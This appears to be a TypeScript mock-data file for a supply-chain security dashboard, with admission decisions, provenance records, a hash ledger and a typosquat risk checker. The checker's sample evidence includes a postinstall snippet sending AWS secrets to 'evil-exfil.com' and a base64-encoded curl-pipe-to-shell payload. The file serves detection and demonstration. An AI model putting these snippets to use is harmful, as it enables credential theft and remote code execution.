export interface Decision {
  id: string;
  image: string;
  digest: string;
  namespace: string;
  mode: 'enforce' | 'audit';
  verdict: 'allow' | 'deny';
  trustScore: number;
  timestamp: string;
  failedRule?: string;
  reason?: string;
  remediation?: string;
  rulesEvaluated?: { name: string; status: 'pass' | 'fail' | 'waived'; latencyMs: number }[];
}

export interface ProvenanceNodeData {
  id: string;
  title: string;
  subtitle: string;
  type: string;
  status: 'verified' | 'warning' | 'unverified';
  details: Record<string, string>;
  rawJson?: string;
}

export interface ToastNotification {
  id: string;
  type: 'success' | 'warning' | 'error' | 'info';
  message: string;
}

export interface LedgerBlock {
  index: number;
  decisionId: string;
  timestamp: string;
  verdict: 'allow' | 'deny';
  mode: string;
  image: string;
  prevHash: string;
  hash: string;
  tampered?: boolean;
}

export interface PackageRiskResult {
  name: string;
  ecosystem: string;
  score: number;
  riskLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  isMalicious: boolean;
  factors: { name: string; score: number; severity: string; evidence: string }[];
  astSnippet: string;
}

export const INITIAL_DECISIONS: Decision[] = [
  {
    id: "DEC-2026-9011",
    image: "localhost:5001/sample-app:v1.0.0",
    digest: "sha256:52242b9363649daf33fecab71ff1a41988547a97a966b5b127ca91c186d3023b",
    namespace: "prod",
    mode: "enforce",
    verdict: "allow",
    trustScore: 100,
    timestamp: "2 mins ago",
    rulesEvaluated: [
      { name: "signature_required", status: "pass", latencyMs: 0.12 },
      { name: "provenance_required", status: "pass", latencyMs: 0.18 },
      { name: "sbom_required", status: "pass", latencyMs: 0.08 },
      { name: "vulnerability_gate", status: "pass", latencyMs: 0.15 },
      { name: "base_image_allowlist", status: "pass", latencyMs: 0.06 },
      { name: "dependency_risk_gate", status: "pass", latencyMs: 0.11 },
      { name: "freshness", status: "pass", latencyMs: 0.05 },
      { name: "privileged_workload_extra_scrutiny", status: "pass", latencyMs: 0.04 }
    ]
  },
  {
    id: "DEC-2026-9010",
    image: "registry:2",
    digest: "sha256:a3d8aaa63ed8a129035bf409c90b6a1e3895e7d5d713c4918e69e09d17d0961d",
    namespace: "prod",
    mode: "enforce",
    verdict: "deny",
    trustScore: 50,
    timestamp: "8 mins ago",
    failedRule: "signature_required",
    reason: "Artifact has zero valid cryptographic signatures from approved Fulcio OIDC identity",
    remediation: "Sign the image digest using Sigstore Cosign with an authorized GitHub Actions workflow",
    rulesEvaluated: [
      { name: "signature_required", status: "fail", latencyMs: 0.10 },
      { name: "provenance_required", status: "fail", latencyMs: 0.08 },
      { name: "sbom_required", status: "fail", latencyMs: 0.07 },
      { name: "vulnerability_gate", status: "pass", latencyMs: 0.09 }
    ]
  },
  {
    id: "DEC-2026-9009",
    image: "ghcr.io/attacker/backdoor:latest",
    digest: "sha256:7c12895b777b311a2f64d2e8b8c459012a45b812f8e12349012a450129bc7891",
    namespace: "prod",
    mode: "enforce",
    verdict: "deny",
    trustScore: 20,
    timestamp: "18 mins ago",
    failedRule: "provenance_required",
    reason: "SLSA Build L3 provenance missing or builder identity untrusted",
    remediation: "Generate SLSA Build L3 provenance using approved container generator workflow",
    rulesEvaluated: [
      { name: "signature_required", status: "fail", latencyMs: 0.11 },
      { name: "provenance_required", status: "fail", latencyMs: 0.14 },
      { name: "dependency_risk_gate", status: "fail", latencyMs: 0.16 }
    ]
  },
  {
    id: "DEC-2026-9008",
    image: "localhost:5001/sample-app:v0.9.0",
    digest: "sha256:9dd2625a1ff2859b8d8b01d8f7822c0f528942fe56cfe7a1e7c38d3b8d72d679",
    namespace: "staging",
    mode: "audit",
    verdict: "allow",
    trustScore: 75,
    timestamp: "35 mins ago",
    failedRule: "freshness",
    reason: "Build timestamp older than 30 days (Non-blocking in audit mode)",
    remediation: "Rebuild image to refresh pipeline freshness timestamp",
    rulesEvaluated: [
      { name: "signature_required", status: "pass", latencyMs: 0.10 },
      { name: "provenance_required", status: "pass", latencyMs: 0.12 },
      { name: "freshness", status: "fail", latencyMs: 0.06 }
    ]
  }
];

export const PROVENANCE_FLOW: ProvenanceNodeData[] = [
  {
    id: "commit",
    title: "Git Commit",
    subtitle: "700695e (Signed)",
    type: "Source Repo",
    status: "verified",
    details: {
      "Repository": "https://github.com/BYTEGUARDIAN14/aegischain",
      "Branch": "refs/heads/main",
      "Commit SHA": "700695e28a9b3cf01e4912ab01c84918e7d23a19",
      "Signer": "principal-sec@byteaegis.in (SSH GPG)",
      "Dirty Tree": "false (Clean workspace)"
    },
    rawJson: `{
  "commit": "700695e28a9b3cf01e4912ab01c84918e7d23a19",
  "author": "ByteGuardian Security Team",
  "gpg_verified": true,
  "branch": "main",
  "tree_clean": true
}`
  },
  {
    id: "workflow",
    title: "Hardened CI Workflow",
    subtitle: "release.yml (Pinned Actions)",
    type: "GitHub Actions OIDC",
    status: "verified",
    details: {
      "Workflow": ".github/workflows/sample-app-release.yml",
      "Run ID": "1899201",
      "OIDC Issuer": "https://token.actions.githubusercontent.com",
      "Egress Policy": "Harden-Runner Block Mode",
      "Persisted Credentials": "false (Ephemeral runner token)"
    },
    rawJson: `{
  "iss": "https://token.actions.githubusercontent.com",
  "sub": "repo:BYTEGUARDIAN14/aegischain:ref:refs/heads/main",
  "workflow": ".github/workflows/sample-app-release.yml",
  "sha": "700695e28a9b3cf01e4912ab01c84918e7d23a19"
}`
  },
  {
    id: "builder",
    title: "SLSA Builder L3",
    subtitle: "slsa-github-generator",
    type: "Isolated Builder",
    status: "verified",
    details: {
      "SLSA Level": "Build Level 3 (Highest Hermetic Tier)",
      "Builder ID": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.0.0",
      "Hermetic Build": "true (Isolated environment)",
      "Cache Poisoning Protection": "active (Zero unpinned build inputs)"
    },
    rawJson: `{
  "_type": "https://in-toto.io/Statement/v1",
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {
      "buildType": "https://slsa.dev/container-based-build/v1"
    },
    "runDetails": {
      "builder": {
        "id": "https://github.com/slsa-framework/slsa-github-generator/...@refs/tags/v2.0.0"
      }
    }
  }
}`
  },
  {
    id: "sbom",
    title: "Syft SBOM Attestation",
    subtitle: "CycloneDX 1.5 JSON",
    type: "Attestation",
    status: "verified",
    details: {
      "Specification": "CycloneDX v1.5 JSON & SPDX 2.3",
      "Component Count": "48 distinct dependencies cataloged",
      "Digest In-Toto Match": "sha256:52242b936... matched bit-for-bit",
      "Attestation Signer": "Cosign Keyless via Rekor log entry"
    },
    rawJson: `{
  "_type": "https://in-toto.io/Statement/v1",
  "predicateType": "https://cyclonedx.org/schema",
  "predicate": {
    "bomFormat": "CycloneDX",
    "specVersion": "1.5",
    "componentsCount": 48
  }
}`
  },
  {
    id: "vex",
    title: "OpenVEX Statement",
    subtitle: "Signed Vulnerability Status",
    type: "VEX Attestation",
    status: "verified",
    details: {
      "Synthesis": "Merged Trivy, Grype & OSV feeds",
      "CISA KEV Known Exploits": "0 active unmitigated",
      "VEX Statements": "Signed OpenVEX v0.2.0 justification",
      "Verdict": "Not Affected (vulnerable code not executed)"
    },
    rawJson: `{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "@id": "https://aegischain.dev/vex/2026-sample-app",
  "statements": [
    {
      "vulnerability": "CVE-2023-44487",
      "status": "not_affected",
      "justification": "vulnerable_code_not_in_execute_path"
    }
  ]
}`
  },
  {
    id: "digest",
    title: "Immutable OCI Digest",
    subtitle: "sha256:52242b936...",
    type: "Container Manifest",
    status: "verified",
    details: {
      "Image Reference": "localhost:5001/sample-app:v1.0.0",
      "Manifest Digest": "sha256:52242b9363649daf33fecab71ff1a41988547a97a966b5b127ca91c186d3023b",
      "Cosign Signature": "Verified (Rekor Entry #10892)",
      "Attestations": "SLSA L3, CycloneDX, Trivy Vuln, OpenVEX",
      "Trust Score": "100 / 100"
    },
    rawJson: `{
  "image": "localhost:5001/sample-app:v1.0.0",
  "digest": "sha256:52242b9363649daf33fecab71ff1a41988547a97a966b5b127ca91c186d3023b",
  "signatures": 1,
  "attestations": 4,
  "trustScore": 100
}`
  },
  {
    id: "pod",
    title: "Kubernetes Pod",
    subtitle: "clean-workload (Running)",
    type: "Cluster Admission",
    status: "verified",
    details: {
      "Namespace": "prod (mode: enforce)",
      "Cluster": "kind-aegischain-cluster",
      "Admission Webhook": "validate.aegischain.dev",
      "Security Context": "runAsNonRoot: 65532, drop ALL",
      "Pod Status": "1/1 Running"
    },
    rawJson: `{
  "kind": "Pod",
  "metadata": {
    "name": "sample-app-deployment-64d8878b4d-z98kf",
    "namespace": "prod"
  },
  "status": {
    "phase": "Running",
    "admissionVerdict": "allow",
    "webhookLatencyMs": 0.68
  }
}`
  }
];

export const INITIAL_LEDGER_BLOCKS: LedgerBlock[] = [
  {
    index: 0,
    decisionId: "DEC-GENESIS-0000",
    timestamp: "2026-10-18T00:00:00Z",
    verdict: "allow",
    mode: "genesis",
    image: "system/genesis-anchor",
    prevHash: "0000000000000000000000000000000000000000000000000000000000000000",
    hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
  },
  {
    index: 1,
    decisionId: "DEC-2026-9008",
    timestamp: "2026-10-18T05:25:12Z",
    verdict: "allow",
    mode: "audit",
    image: "localhost:5001/sample-app:v0.9.0",
    prevHash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    hash: "61829a28c30489ba9c04918237ba40912cb84918239049182390481290384019"
  },
  {
    index: 2,
    decisionId: "DEC-2026-9009",
    timestamp: "2026-10-18T05:42:01Z",
    verdict: "deny",
    mode: "enforce",
    image: "ghcr.io/attacker/backdoor:latest",
    prevHash: "61829a28c30489ba9c04918237ba40912cb84918239049182390481290384019",
    hash: "7401923840918239048129038401928340192834091823094812093840192834"
  },
  {
    index: 3,
    decisionId: "DEC-2026-9010",
    timestamp: "2026-10-18T05:52:19Z",
    verdict: "deny",
    mode: "enforce",
    image: "registry:2",
    prevHash: "7401923840918239048129038401928340192834091823094812093840192834",
    hash: "8912304918209384019283401928340918230948120938401928340192834019"
  },
  {
    index: 4,
    decisionId: "DEC-2026-9011",
    timestamp: "2026-10-18T05:58:33Z",
    verdict: "allow",
    mode: "enforce",
    image: "localhost:5001/sample-app:v1.0.0",
    prevHash: "8912304918209384019283401928340918230948120938401928340192834019",
    hash: "ac3b955f28491820394810293840192834019283401928340918230948120938"
  }
];

export function calculatePackageRisk(name: string): PackageRiskResult {
  const lower = name.toLowerCase().trim();
  if (lower === 'crossenv') {
    return {
      name: 'crossenv',
      ecosystem: 'npm',
      score: 100,
      riskLevel: 'CRITICAL',
      isMalicious: true,
      factors: [
        { name: 'osv_malicious_advisory', score: 100, severity: 'CRITICAL', evidence: 'Listed in security advisory MAL-2017-001 (Steals and exfiltrates process environment variables)' },
        { name: 'separator_trick', score: 80, severity: 'CRITICAL', evidence: "Exact match on normalized name with top-100 package 'cross-env'" },
        { name: 'credential_exfiltration', score: 90, severity: 'CRITICAL', evidence: 'Access pattern to AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN in postinstall lifecycle hook' },
        { name: 'network_socket_beacon', score: 85, severity: 'CRITICAL', evidence: 'Opens raw outbound TCP socket to remote IP: 45.33.32.156:443' }
      ],
      astSnippet: `// package.json postinstall hook:
"scripts": { "postinstall": "node setup.js" }

// setup.js AST AST_CALL_EXPRESSION:
const env = process.env;
const https = require('https');
https.request({
  host: 'evil-exfil.com',
  path: '/?token=' + encodeURIComponent(env.AWS_SECRET_ACCESS_KEY)
}).end();`
    };
  } else if (lower === 'requsts' || lower === 'reqests') {
    return {
      name: lower,
      ecosystem: 'pypi',
      score: 100,
      riskLevel: 'CRITICAL',
      isMalicious: true,
      factors: [
        { name: 'damerau_levenshtein_distance_1', score: 85, severity: 'CRITICAL', evidence: "Damerau-Levenshtein edit distance of 1 from top-downloaded PyPI package 'requests'" },
        { name: 'python_process_execution', score: 65, severity: 'HIGH', evidence: 'Direct execution of system commands (os.system / subprocess.Popen) in setup.py' }
      ],
      astSnippet: `# setup.py AST_CALL:
import os, base64
payload = "Y3VybCBodHRwczovL2F0dGFjay5pbi9iYWNrZG9vciB8IHNo"
os.system(base64.b64decode(payload).decode())`
    };
  } else if (lower === 'byteaegis-auth' || lower === 'corp-internal' || lower === 'torch-triton') {
    return {
      name: lower,
      ecosystem: 'pypi/npm',
      score: 90,
      riskLevel: 'CRITICAL',
      isMalicious: false,
      factors: [
        { name: 'internal_naming_pattern', score: 50, severity: 'HIGH', evidence: 'Matches corporate internal namespace prefix pattern (Potential Dependency Confusion)' },
        { name: 'inflated_version_number', score: 40, severity: 'HIGH', evidence: 'Anomalously high public release version (99.0.0) intended to take precedence over internal repo' }
      ],
      astSnippet: `# Detected dependency confusion vector:
# Public registry package published with version 99.0.0
# Internal package registry uses version 1.2.0`
    };
  } else {
    return {
      name: name,
      ecosystem: 'npm/pypi',
      score: 0,
      riskLevel: 'LOW',
      isMalicious: false,
      factors: [],
      astSnippet: `// Clean package AST. Zero suspicious lifecycle hooks or exfiltration patterns detected.`
    };
  }
}
